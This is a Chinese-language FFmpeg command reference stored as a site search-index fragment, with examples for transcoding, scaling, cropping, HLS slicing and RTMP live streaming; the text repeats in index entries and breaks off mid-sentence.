\u5982\u679c\u53c2\u6570\u6709\u8bef\uff0c\u5927\u5bb6\u53ef\u5bf9\u7167\u6587\u7ae0\uff0d FFmpeg\u53c2\u6570\u547d\u4ee4 \uff0c\u8fdb\u884c\u4fee\u6539\u3002 \u7b2c\u4e00\u7ec4 1.\u5206\u79bb\u89c6\u9891\u97f3\u9891\u6d41 ffmpeg -i input_file -vcodec copy -an output_file_video\u3000\u3000//\u5206\u79bb\u89c6\u9891\u6d41ffmpeg -i input_file -acodec copy -vn output_file_audio\u3000\u3000//\u5206\u79bb\u97f3\u9891\u6d41 2.\u89c6\u9891\u89e3\u590d\u7528 ffmpeg \u2013i test.mp4 \u2013vcodec copy \u2013an \u2013f m4v test.264 ffmpeg \u2013i test.avi \u2013vcodec copy \u2013an \u2013f m4v test.264 3.\u89c6\u9891\u8f6c\u7801 ffmpeg \u2013i test.mp4 \u2013vcodec h264 \u2013s 352*278 \u2013an \u2013f m4v test.264 //\u8f6c\u7801\u4e3a\u7801\u6d41\u539f\u59cb\u6587\u4ef6 ffmpeg \u2013i test.mp4 \u2013vcodec h264 \u2013bf 0 \u2013g 25 \u2013s 352*278 \u2013an \u2013f m4v test.264 //\u8f6c\u7801\u4e3a\u7801\u6d41\u539f\u59cb\u6587\u4ef6 ffmpeg \u2013i test.avi -vcodec mpeg4 \u2013vtag xvid \u2013qsame test_xvid.avi //\u8f6c\u7801\u4e3a\u5c01\u88c5\u6587\u4ef6 \u8bf4\u660e\uff1a -bf B\u5e27\u6570\u76ee\u63a7\u5236\uff0c-g \u5173\u952e\u5e27\u95f4\u9694\u63a7\u5236\uff0c-s \u5206\u8fa8\u7387\u63a7\u5236 4.\u89c6\u9891\u5c01\u88c5 ffmpeg \u2013i video_file \u2013i audio_file \u2013vcodec copy \u2013acodec copy output_file 5.\u89c6\u9891\u526a\u5207 ffmpeg \u2013i test.avi \u2013r 1 \u2013f image2 image-%3d.jpeg //\u63d0\u53d6\u56fe\u7247 ffmpeg -ss 0:1:30 -t 0:0:20 -i input.avi -vcodec copy -acodec copy output.avi //\u526a\u5207\u89c6\u9891//-r \u63d0\u53d6\u56fe\u50cf\u7684\u9891\u7387\uff0c-ss \u5f00\u59cb\u65f6\u95f4\uff0c-t \u6301\u7eed\u65f6\u95f4 6.\u89c6\u9891\u5f55\u5236 ffmpeg \u2013i rtsp://192.168.3.205:5555/test \u2013vcodec copy out.avi 7\u3001\u5229\u7528ffmpeg\u89c6\u9891\u5207\u7247 \u4e3b\u8981\u628a\u89c6\u9891\u6e90\u5207\u6210\u82e5\u5e72\u4e2a.ts\u683c\u5f0f\u7684\u89c6\u9891\u7247\u6bb5\u7136\u540e\u751f\u6210\u4e00\u4e2a.m3u8\u7684\u5207\u7247\u6587\u4ef6\u7d22\u5f15\u63d0\u4f9b\u7ed9html5\u7684video\u505ahls\u76f4\u64ad\u6e90 \u547d\u4ee4\u5982\u4e0b\uff1a ffmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -strict -2 -c:v libx264 -c:a aac -f hls m3u8\u6587\u4ef6\u8f93\u51fa\u5730\u5740 8\u3001ffmpeg\u7f29\u653e\u89c6\u9891 \u5047\u8bbe\u539f\u59cb\u89c6\u9891\u5c3a\u5bf8\u662f 1080p\uff08\u5373 1920\u00d71080 px\uff0c16:9\uff09\uff0c\u4f7f\u7528\u4e0b\u9762\u547d\u4ee4\u53ef\u4ee5\u7f29\u5c0f\u5230 480p\uff1a \u547d\u4ee4\u5982\u4e0b\uff1a ffmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -vf scale=853:480 -acodec aac -vcodec h264 \u89c6\u9891\u8f93\u51fa\u5730\u5740\uff08\u5982\uff1aout.mp4\uff09 \u5404\u4e2a\u53c2\u6570\u7684\u542b\u4e49\uff1a-i a.mov \u6307\u5b9a\u5f85\u5904\u7406\u89c6\u9891\u7684\u6587\u4ef6\u540d-vf scale=853:480 vf \u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u89c6\u9891\u6ee4\u955c\uff0c\u5176\u4e2d scale \u8868\u793a\u7f29\u653e\uff0c\u540e\u9762\u7684\u6570\u5b57\u8868\u793a\u7f29\u653e\u81f3 853\u00d7480 px\uff0c\u5176\u4e2d\u7684 853px \u662f\u8ba1\u7b97\u800c\u5f97\uff0c\u56e0\u4e3a\u539f\u59cb\u89c6\u9891\u7684\u5bbd\u9ad8\u6bd4\u4e3a 16:9\uff0c\u6240\u4ee5\u4e3a\u4e86\u8ba9\u76ee\u6807\u89c6\u9891\u7684\u9ad8\u5ea6\u4e3a 480px\uff0c\u5219\u5bbd\u5ea6 = 480 x 9 / 16 = 853-acodec aac \u6307\u5b9a\u97f3\u9891\u4f7f\u7528 aac \u7f16\u7801\u3002\u6ce8\uff1a\u56e0\u4e3a ffmpeg \u7684\u5185\u7f6e aac \u7f16\u7801\u76ee\u524d\uff08\u5199\u8fd9\u7bc7\u6587\u7ae0\u65f6\uff09\u8fd8\u662f\u8bd5\u9a8c\u9636\u6bb5\uff0c\u6545\u4f1a\u63d0\u793a\u6dfb\u52a0\u53c2\u6570 \u201c-strict -2\u201d \u624d\u80fd\u7ee7\u7eed\uff0c\u5c3d\u7ba1\u6dfb\u52a0\u5373\u53ef\u3002\u53c8\u6216\u8005\u4f7f\u7528\u5916\u90e8\u7684 libfaac\uff08\u9700\u8981\u91cd\u65b0\u7f16\u8bd1 ffmpeg\uff09\u3002-vcodec h264 \u6307\u5b9a\u89c6\u9891\u4f7f\u7528 h264 \u7f16\u7801\u3002\u6ce8\uff1a\u76ee\u524d\u624b\u673a\u4e00\u822c\u89c6\u9891\u62cd\u6444\u7684\u683c\u5f0f\uff08\u5c01\u88c5\u683c\u5f0f\u3001\u6587\u4ef6\u683c\u5f0f\uff09\u4e3a mov \u6216\u8005 mp4\uff0c\u8fd9\u4e24\u8005\u7684\u97f3\u9891\u7f16\u7801\u90fd\u662f aac\uff0c\u89c6\u9891\u90fd\u662f h264\u3002out.mp4 \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d\u4e0a\u9762\u7684\u53c2\u6570 scale=853:480 \u5f53\u4e2d\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\u901a\u5e38\u53ea\u9700\u6307\u5b9a\u4e00\u4e2a\uff0c\u6bd4\u5982\u6307\u5b9a\u9ad8\u5ea6\u4e3a 480 \u6216\u8005 720\uff0c\u81f3\u4e8e\u5bbd\u5ea6\u5219\u53ef\u4ee5\u4f20\u5165 \u201c-1\u201d \u8868\u793a\u7531\u539f\u59cb\u89c6\u9891\u7684\u5bbd\u9ad8\u6bd4\u81ea\u52a8\u8ba1\u7b97\u800c\u5f97\u3002\u5373\u53c2\u6570\u53ef\u4ee5\u5199\u4e3a\uff1ascale=-1:480\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5 scale=480:-1 9\u3001ffmpeg\u88c1\u526a \u6709\u65f6\u53ef\u80fd\u53ea\u9700\u8981\u89c6\u9891\u7684\u6b63\u4e2d\u4e00\u5757\uff0c\u800c\u4e24\u5934\u7684\u5185\u5bb9\u4e0d\u9700\u8981\uff0c\u8fd9\u65f6\u53ef\u4ee5\u5bf9\u89c6\u9891\u8fdb\u884c\u88c1\u526a\uff08crop\uff09\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u7ad6\u5411\u7684\u89c6\u9891 1080 x 1920\uff0c\u5982\u679c\u6307\u5411\u4fdd\u7559\u4e2d\u95f4 1080\u00d71080 \u90e8\u5206\u547d\u4ee4\u5982\u4e0b\uff1affmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -strict -2 -vf crop=1080:1080:0:420 \u89c6\u9891\u8f93\u51fa\u5730\u5740\uff08\u5982\uff1aout.mp4\uff09 \u5176\u4e2d\u7684 crop=1080:1080:0:420 \u624d\u88c1\u526a\u53c2\u6570\uff0c\u5177\u4f53\u542b\u4e49\u662f crop=width:height:x:y\uff0c\u5176\u4e2d width \u548c height \u8868\u793a\u88c1\u526a\u540e\u7684\u5c3a\u5bf8\uff0cx:y \u8868\u793a\u88c1\u526a\u533a\u57df\u7684\u5de6\u4e0a\u89d2\u5750\u6807\u3002\u6bd4\u5982\u5f53\u524d\u8fd9\u4e2a\u793a\u4f8b\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u7559\u7ad6\u5411\u89c6\u9891\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u6240\u4ee5 x \u4e0d\u7528\u504f\u79fb\uff0c\u6545\u4f20\u51650\uff0c\u800c y \u5219\u9700\u8981\u5411\u4e0b\u504f\u79fb\uff1a(1920 \u2013 1080) / 2 = 420 10. \u8f6c\u89c6\u9891\u683c\u5f0f ffmpeng -i source.mp4 -c:v libx264 -crf 24 destination.flv \u5176\u4e2d -crf \u5f88\u91cd\u8981\uff0c\u662f\u63a7\u5236\u8f6c\u7801\u540e\u89c6\u9891\u7684\u8d28\u91cf\uff0c\u8d28\u91cf\u8d8a\u9ad8\uff0c\u6587\u4ef6\u4e5f\u5c31\u8d8a\u5927\u3002 \u6b64\u503c\u7684\u8303\u56f4\u662f 0 \u5230 51\uff1a0 \u8868\u793a\u9ad8\u6e05\u65e0\u635f\uff1b23 \u662f\u9ed8\u8ba4\u503c\uff08\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u6b64\u53c2\u6570\uff09\uff1b51 \u867d\u7136\u6587\u4ef6\u6700\u5c0f\uff0c\u4f46\u6548\u679c\u662f\u6700\u5dee\u7684\u3002 \u503c\u8d8a\u5c0f\uff0c\u8d28\u91cf\u8d8a\u9ad8\uff0c\u4f46\u6587\u4ef6\u4e5f\u8d8a\u5927\uff0c\u5efa\u8bae\u7684\u503c\u8303\u56f4\u662f 18 \u5230 28\u3002\u800c\u503c 18 \u662f\u89c6\u89c9\u4e0a\u770b\u8d77\u6765\u65e0\u635f\u6216\u63a5\u8fd1\u65e0\u635f\u7684\uff0c\u5f53\u7136\u4e0d\u4ee3\u8868\u662f\u6570\u636e\uff08\u6280\u672f\u4e0a\uff09\u7684\u8f6c\u7801\u65e0\u635f\u3002 \u7b2c\u4e8c\u7ec4 1.ffmpeg \u628a\u6587\u4ef6\u5f53\u505a\u76f4\u64ad\u63a8\u9001\u81f3\u670d\u52a1\u5668 (RTMP + FLV) ffmpeg - re -i demo.mp4 -c copy - f flv rtmp://w.gslb.letv/live/streamid 2.\u5c06\u76f4\u64ad\u7684\u5a92\u4f53\u4fdd\u5b58\u5230\u672c\u5730 ffmpeg -i rtmp://r.glsb.letv/live/streamid -c copy streamfile.flv 3.\u5c06\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u5668 ffmpeg -i rtmp://r.glsb.letv/live/streamidA -c:a libfaac -ar 44100 -ab 48k -c:v libx264 -vpre slow -vpre baseline -f flv rtmp://w.glsb.letv/live/streamb 4.\u63d0\u53d6\u89c6\u9891\u4e2d\u7684\u97f3\u9891,\u5e76\u4fdd\u5b58\u4e3amp3 \u7136\u540e\u8f93\u51fa ffmpeg -i input.avi -b:a 128k output.mp3 \u7b2c\u4e09\u7ec4 1.\u83b7\u53d6\u89c6\u9891\u7684\u4fe1\u606f ffmpeg -i video.avi 2.\u5c06\u56fe\u7247\u5e8f\u5217\u5408\u6210\u89c6\u9891 ffmpeg -f image2 -i image%d.jpg video.mpg \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u628a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u56fe\u7247\uff08\u540d\u5b57\u5982\uff1aimage1.jpg. image2.jpg. \u7b49...\uff09\u5408\u5e76\u6210video.mpg 3.\u5c06\u89c6\u9891\u5206\u89e3\u6210\u56fe\u7247\u5e8f\u5217 ffmpeg -i video.mpg image%d.jpg \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u751f\u6210image1.jpg. image2.jpg. ... \u652f\u6301\u7684\u56fe\u7247\u683c\u5f0f\u6709\uff1aPGM. PPM. PAM. PGMYUV. JPEG. GIF. PNG. TIFF. SGI 4.\u4e3a\u89c6\u9891\u91cd\u65b0\u7f16\u7801\u4ee5\u9002\u5408\u5728iPod/iPhone\u4e0a\u64ad\u653e ffmpeg -i source_video.avi input -acodec aac -ab 128kb -vcodec mpeg4 -b 1200kb -mbd 2 -flags +4mv+trell -aic 2 -cmp 2 -subcmp 2 -s 320x180 -title X final_video.mp4 5.\u4e3a\u89c6\u9891\u91cd\u65b0\u7f16\u7801\u4ee5\u9002\u5408\u5728PSP\u4e0a\u64ad\u653e ffmpeg -i source_video.avi -b 300 -s 320x240 -vcodec xvid -ab 32 -ar 24000 -acodec aac final_video.mp4 6.\u4ece\u89c6\u9891\u62bd\u51fa\u58f0\u97f3.\u5e76\u5b58\u4e3aMp3 ffmpeg -i source_video.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 sound.mp3 7.\u5c06wav\u6587\u4ef6\u8f6c\u6210Mp3 ffmpeg -i son_origine.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 son_final.mp3 8.\u5c06.avi\u89c6\u9891\u8f6c\u6210.mpg ffmpeg -i video_origine.avi video_finale.mpg 9.\u5c06.mpg\u8f6c\u6210.avi ffmpeg -i video_origine.mpg video_finale.avi 10.\u5c06.avi\u8f6c\u6210gif\u52a8\u753b\uff08\u672a\u538b\u7f29\uff09 ffmpeg -i video_origine.avi gif_anime.gif 11.\u5408\u6210\u89c6\u9891\u548c\u97f3\u9891 ffmpeg -i son.wav -i video_origine.avi video_finale.mpg 12.\u5c06.avi\u8f6c\u6210.flv ffmpeg -i video_origine.avi -ab 56 -ar 44100 -b 200 -r 15 -s 320x240 -f flv video_finale.flv 13.\u5c06.avi\u8f6c\u6210dv ffmpeg -i video_origine.avi -s pal -r pal -aspect 4:3 -ar 48000 -ac 2 video_finale.dv \u6216\u8005\uff1a ffmpeg -i video_origine.avi -target pal-dv video_finale.dv 14.\u5c06.avi\u538b\u7f29\u6210divx ffmpeg -i video_origine.avi -s 320x240 -vcodec msmpeg4v2 video_finale.avi 15.\u5c06Ogg Theora\u538b\u7f29\u6210Mpeg dvd ffmpeg -i film_sortie_cinelerra.ogm -s 720x576 -vcodec mpeg2video -acodec mp3 film_terminate.mpg 16.\u5c06.avi\u538b\u7f29\u6210SVCD mpeg2 NTSC\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target ntsc-svcd video_finale.mpg PAL\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target pal-dvcd video_finale.mpg 17.\u5c06.avi\u538b\u7f29\u6210VCD mpeg2 NTSC\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target ntsc-vcd video_finale.mpg PAL\u683c\u5f0f\uff1a ffmpeg -i video_origine.avi -target pal-vcd video_finale.mpg 18.\u591a\u901a\u9053\u7f16\u7801 ffmpeg -i fichierentree -pass 2 -passlogfile ffmpeg2pass fichiersortie-2 19.\u4eceflv\u63d0\u53d6mp3 ffmpeg -i source.flv -ab 128k dest.mp3 \u7b2c\u56db\u7ec4 1\u3001\u5c06\u6587\u4ef6\u5f53\u505a\u76f4\u64ad\u9001\u81f3live ffmpeg -re -i localFile.mp4 -c copy -f flv rtmp://server/live/streamName 2\u3001\u5c06\u76f4\u64ad\u5a92\u4f53\u4fdd\u5b58\u81f3\u672c\u5730\u6587\u4ef6 ffmpeg -i rtmp://server/live/streamName -c copy dump.flv 3\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u4e0d\u53d8\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv rtmp://server/live/h264Stream 4\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -c:a libfaac -ar 44100 -ab 48k -c:v libx264 -vpre slow -vpre baseline -f flv rtmp://server/live/h264Stream 5\u3001\u5c06\u5176\u4e2d\u4e00\u4e2a\u76f4\u64ad\u6d41\uff0c\u89c6\u9891\u4e0d\u53d8\uff0c\u97f3\u9891\u6539\u7528faac\u538b\u7f29\uff0c\u9001\u81f3\u53e6\u5916\u4e00\u4e2a\u76f4\u64ad\u670d\u52a1\u6d41 ffmpeg -i rtmp://server/live/originalStream -acodec libfaac -ar 44100 -ab 48k -vcodec copy -f flv rtmp://server/live/h264_AAC_Stream 6\u3001\u5c06\u4e00\u4e2a\u9ad8\u6e05\u6d41\uff0c\u590d\u5236\u4e3a\u51e0\u4e2a\u4e0d\u540c\u89c6\u9891\u6e05\u6670\u5ea6\u7684\u6d41\u91cd\u65b0\u53d1\u5e03\uff0c\u5176\u4e2d\u97f3\u9891\u4e0d\u53d8 ffmpeg -re -i rtmp://server/live/high_FMLE_stream -acodec copy -vcodec x264lib -s 640\u00d7360 -b 500k -vpre medium -vpre baseline rtmp://server/live/baseline_500k -acodec copy -vcodec x264lib -s 480\u00d7272 -b 300k -vpre medium -vpre baseline rtmp://server/live/baseline_300k -acodec copy -vcodec x264lib -s 320\u00d7200 -b 150k -vpre medium -vpre baseline rtmp://server/live/baseline_150k -acodec libfaac -vn -ab 48k rtmp://server/live/audio_only_AAC_48k 7\u3001\u529f\u80fd\u4e00\u6837\uff0c\u53ea\u662f\u91c7\u7528-x264opts\u9009\u9879 ffmpeg -re -i rtmp://server/live/high_FMLE_stream -c:a copy -c:v x264lib -s 640\u00d7360 -x264opts bitrate=500:profile=baseline:preset=slow rtmp://server/live/baseline_500k -c:a copy -c:v x264lib -s 480\u00d7272 -x264opts bitrate=300:profile=baseline:preset=slow rtmp://server/live/baseline_300k -c:a copy -c:v x264lib -s 320\u00d7200 -x264opts bitrate=150:profile=baseline:preset=slow rtmp://server/live/baseline_150k -c:a libfaac -vn -b:a 48k rtmp://server/live/audio_only_AAC_48k 8\u3001\u5c06\u5f53\u524d\u6444\u50cf\u5934\u53ca\u97f3\u9891\u901a\u8fc7DSSHOW\u91c7\u96c6\uff0c\u89c6\u9891h264\u3001\u97f3\u9891faac\u538b\u7f29\u540e\u53d1\u5e03 ffmpeg -r 25 -f dshow -s 640\u00d7480 -i video=\u201dvideo source name\u201d:audio=\u201daudio source name\u201d -vcodec libx264 -b 600k -vpre slow -acodec libfaac -ab 128k -f flv rtmp://server/application/stream_name 9\u3001\u5c06\u4e00\u4e2aJPG\u56fe\u7247\u7ecf\u8fc7h264\u538b\u7f29\u5faa\u73af\u8f93\u51fa\u4e3amp4\u89c6\u9891 ffmpeg.exe -i INPUT.jpg -an -vcodec libx264 -coder 1 -flags +loop -cmp +chroma -subq 10 -qcomp 0.6 -qmin 10 -qmax 51 -qdiff 4 -flags2 +dct8x8 -trellis 2 -partitions +parti8x8+parti4x4 -crf 24 -threads 0 -r 25 -g 25 -y OUTPUT.mp4 10\u3001\u5c06\u666e\u901a\u6d41\u89c6\u9891\u6539\u7528h264\u538b\u7f29\uff0c\u97f3\u9891\u4e0d\u53d8\uff0c\u9001\u81f3\u9ad8\u6e05\u6d41\u670d\u52a1(\u65b0\u7248\u672cFMS live=1) ffmpeg -i rtmp://server/live/originalStream -c:a copy -c:v libx264 -vpre slow -f flv \"rtmp://server/live/h264Stream live=1\" \u6587\uff0f\u9a9a\u4e4b\u54c8\u585e\u7d66\uff08\u7b80\u4e66\u4f5c\u8005\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/a035056cbbf9","title":"FFmpeg\u529f\u80fd\u547d\u4ee4\u6c47\u603b"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#_1","text":"\u5982\u6b64\u5f3a\u5927\u7684FFmpeg\uff0c\u80fd\u591f\u5b9e\u73b0\u89c6\u9891\u91c7\u96c6\u3001\u89c6\u9891\u683c\u5f0f\u8f6c\u5316\u3001\u89c6\u9891\u622a\u56fe\u3001\u89c6\u9891\u6dfb\u52a0\u6c34\u5370\u3001\u89c6\u9891\u5207\u7247\u3001\u89c6\u9891\u5f55\u5236\u3001\u89c6\u9891\u63a8\u6d41\u3001\u66f4\u6539\u97f3\u89c6\u9891\u53c2\u6570\u529f\u80fd\u7b49\u3002\u901a\u8fc7\u7ec8\u7aef\u547d\u4ee4\u5982\u4f55\u5b9e\u73b0\u8fd9\u4e9b\u529f\u80fd\uff0cRichy\u5728\u672c\u6587\u505a\u4e00\u8bb0\u5f55\uff0c\u4ee5\u5907\u4e4b\u540e\u67e5\u9605\u3002 \u6ce8\u610f\uff1a\u4e0b\u9762\u4e00\u4e00\u5217\u4e3e\u7684\u547d\u4ee4\uff0c\u672a\u5f52\u7c7b\u6574\u7406\uff0c\u547d\u4ee4\u53c2\u6570\u4f9b\u53c2\u8003\u3002 \u5982\u679c\u53c2\u6570\u6709\u8bef\uff0c\u5927\u5bb6\u53ef\u5bf9\u7167\u6587\u7ae0\uff0d FFmpeg\u53c2\u6570\u547d\u4ee4 \uff0c\u8fdb\u884c\u4fee\u6539\u3002","title":"\u524d\u8a00"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/#_2","text":"1.\u5206\u79bb\u89c6\u9891\u97f3\u9891\u6d41 ffmpeg -i input_file -vcodec copy -an output_file_video\u3000\u3000//\u5206\u79bb\u89c6\u9891\u6d41ffmpeg -i input_file -acodec copy -vn output_file_audio\u3000\u3000//\u5206\u79bb\u97f3\u9891\u6d41 2.\u89c6\u9891\u89e3\u590d\u7528 ffmpeg \u2013i test.mp4 \u2013vcodec copy \u2013an \u2013f m4v test.264 ffmpeg \u2013i test.avi \u2013vcodec copy \u2013an \u2013f m4v test.264 3.\u89c6\u9891\u8f6c\u7801 ffmpeg \u2013i test.mp4 \u2013vcodec h264 \u2013s 352*278 \u2013an \u2013f m4v test.264 //\u8f6c\u7801\u4e3a\u7801\u6d41\u539f\u59cb\u6587\u4ef6 ffmpeg \u2013i test.mp4 \u2013vcodec h264 \u2013bf 0 \u2013g 25 \u2013s 352*278 \u2013an \u2013f m4v test.264 //\u8f6c\u7801\u4e3a\u7801\u6d41\u539f\u59cb\u6587\u4ef6 ffmpeg \u2013i test.avi -vcodec mpeg4 \u2013vtag xvid \u2013qsame test_xvid.avi //\u8f6c\u7801\u4e3a\u5c01\u88c5\u6587\u4ef6 \u8bf4\u660e\uff1a -bf B\u5e27\u6570\u76ee\u63a7\u5236\uff0c-g \u5173\u952e\u5e27\u95f4\u9694\u63a7\u5236\uff0c-s \u5206\u8fa8\u7387\u63a7\u5236 4.\u89c6\u9891\u5c01\u88c5 ffmpeg \u2013i video_file \u2013i audio_file \u2013vcodec copy \u2013acodec copy output_file 5.\u89c6\u9891\u526a\u5207 ffmpeg \u2013i test.avi \u2013r 1 \u2013f image2 image-%3d.jpeg //\u63d0\u53d6\u56fe\u7247 ffmpeg -ss 0:1:30 -t 0:0:20 -i input.avi -vcodec copy -acodec copy output.avi //\u526a\u5207\u89c6\u9891//-r \u63d0\u53d6\u56fe\u50cf\u7684\u9891\u7387\uff0c-ss \u5f00\u59cb\u65f6\u95f4\uff0c-t \u6301\u7eed\u65f6\u95f4 6.\u89c6\u9891\u5f55\u5236 ffmpeg \u2013i rtsp://192.168.3.205:5555/test \u2013vcodec copy out.avi 7\u3001\u5229\u7528ffmpeg\u89c6\u9891\u5207\u7247 \u4e3b\u8981\u628a\u89c6\u9891\u6e90\u5207\u6210\u82e5\u5e72\u4e2a.ts\u683c\u5f0f\u7684\u89c6\u9891\u7247\u6bb5\u7136\u540e\u751f\u6210\u4e00\u4e2a.m3u8\u7684\u5207\u7247\u6587\u4ef6\u7d22\u5f15\u63d0\u4f9b\u7ed9html5\u7684video\u505ahls\u76f4\u64ad\u6e90 \u547d\u4ee4\u5982\u4e0b\uff1a ffmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -strict -2 -c:v libx264 -c:a aac -f hls m3u8\u6587\u4ef6\u8f93\u51fa\u5730\u5740 8\u3001ffmpeg\u7f29\u653e\u89c6\u9891 \u5047\u8bbe\u539f\u59cb\u89c6\u9891\u5c3a\u5bf8\u662f 1080p\uff08\u5373 1920\u00d71080 px\uff0c16:9\uff09\uff0c\u4f7f\u7528\u4e0b\u9762\u547d\u4ee4\u53ef\u4ee5\u7f29\u5c0f\u5230 480p\uff1a \u547d\u4ee4\u5982\u4e0b\uff1a ffmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -vf scale=853:480 -acodec aac -vcodec h264 \u89c6\u9891\u8f93\u51fa\u5730\u5740\uff08\u5982\uff1aout.mp4\uff09 \u5404\u4e2a\u53c2\u6570\u7684\u542b\u4e49\uff1a-i a.mov \u6307\u5b9a\u5f85\u5904\u7406\u89c6\u9891\u7684\u6587\u4ef6\u540d-vf scale=853:480 vf \u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u89c6\u9891\u6ee4\u955c\uff0c\u5176\u4e2d scale \u8868\u793a\u7f29\u653e\uff0c\u540e\u9762\u7684\u6570\u5b57\u8868\u793a\u7f29\u653e\u81f3 853\u00d7480 px\uff0c\u5176\u4e2d\u7684 853px \u662f\u8ba1\u7b97\u800c\u5f97\uff0c\u56e0\u4e3a\u539f\u59cb\u89c6\u9891\u7684\u5bbd\u9ad8\u6bd4\u4e3a 16:9\uff0c\u6240\u4ee5\u4e3a\u4e86\u8ba9\u76ee\u6807\u89c6\u9891\u7684\u9ad8\u5ea6\u4e3a 480px\uff0c\u5219\u5bbd\u5ea6 = 480 x 9 / 16 = 853-acodec aac \u6307\u5b9a\u97f3\u9891\u4f7f\u7528 aac \u7f16\u7801\u3002\u6ce8\uff1a\u56e0\u4e3a ffmpeg \u7684\u5185\u7f6e aac \u7f16\u7801\u76ee\u524d\uff08\u5199\u8fd9\u7bc7\u6587\u7ae0\u65f6\uff09\u8fd8\u662f\u8bd5\u9a8c\u9636\u6bb5\uff0c\u6545\u4f1a\u63d0\u793a\u6dfb\u52a0\u53c2\u6570 \u201c-strict -2\u201d \u624d\u80fd\u7ee7\u7eed\uff0c\u5c3d\u7ba1\u6dfb\u52a0\u5373\u53ef\u3002\u53c8\u6216\u8005\u4f7f\u7528\u5916\u90e8\u7684 libfaac\uff08\u9700\u8981\u91cd\u65b0\u7f16\u8bd1 ffmpeg\uff09\u3002-vcodec h264 \u6307\u5b9a\u89c6\u9891\u4f7f\u7528 h264 \u7f16\u7801\u3002\u6ce8\uff1a\u76ee\u524d\u624b\u673a\u4e00\u822c\u89c6\u9891\u62cd\u6444\u7684\u683c\u5f0f\uff08\u5c01\u88c5\u683c\u5f0f\u3001\u6587\u4ef6\u683c\u5f0f\uff09\u4e3a mov \u6216\u8005 mp4\uff0c\u8fd9\u4e24\u8005\u7684\u97f3\u9891\u7f16\u7801\u90fd\u662f aac\uff0c\u89c6\u9891\u90fd\u662f h264\u3002out.mp4 \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d\u4e0a\u9762\u7684\u53c2\u6570 scale=853:480 \u5f53\u4e2d\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\u901a\u5e38\u53ea\u9700\u6307\u5b9a\u4e00\u4e2a\uff0c\u6bd4\u5982\u6307\u5b9a\u9ad8\u5ea6\u4e3a 480 \u6216\u8005 720\uff0c\u81f3\u4e8e\u5bbd\u5ea6\u5219\u53ef\u4ee5\u4f20\u5165 \u201c-1\u201d \u8868\u793a\u7531\u539f\u59cb\u89c6\u9891\u7684\u5bbd\u9ad8\u6bd4\u81ea\u52a8\u8ba1\u7b97\u800c\u5f97\u3002\u5373\u53c2\u6570\u53ef\u4ee5\u5199\u4e3a\uff1ascale=-1:480\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5 scale=480:-1 9\u3001ffmpeg\u88c1\u526a \u6709\u65f6\u53ef\u80fd\u53ea\u9700\u8981\u89c6\u9891\u7684\u6b63\u4e2d\u4e00\u5757\uff0c\u800c\u4e24\u5934\u7684\u5185\u5bb9\u4e0d\u9700\u8981\uff0c\u8fd9\u65f6\u53ef\u4ee5\u5bf9\u89c6\u9891\u8fdb\u884c\u88c1\u526a\uff08crop\uff09\uff0c\u6bd4\u5982\u6709\u4e00\u4e2a\u7ad6\u5411\u7684\u89c6\u9891 1080 x 1920\uff0c\u5982\u679c\u6307\u5411\u4fdd\u7559\u4e2d\u95f4 1080\u00d71080 \u90e8\u5206\u547d\u4ee4\u5982\u4e0b\uff1affmpeg -i \u89c6\u9891\u6e90\u5730\u5740 -strict -2 -vf crop=1080:1080:0:420 \u89c6\u9891\u8f93\u51fa\u5730\u5740\uff08\u5982\uff1aout.mp4\uff09 \u5176\u4e2d\u7684 crop=1080:1080:0:420 \u624d\u88c1\u526a\u53c2\u6570\uff0c\u5177\u4f53\u542b\u4e49\u662f crop=width:height:x:y\uff0c\u5176\u4e2d width \u548c height \u8868\u793a\u88c1\u526a\u540e\u7684\u5c3a\u5bf8\uff0cx:y 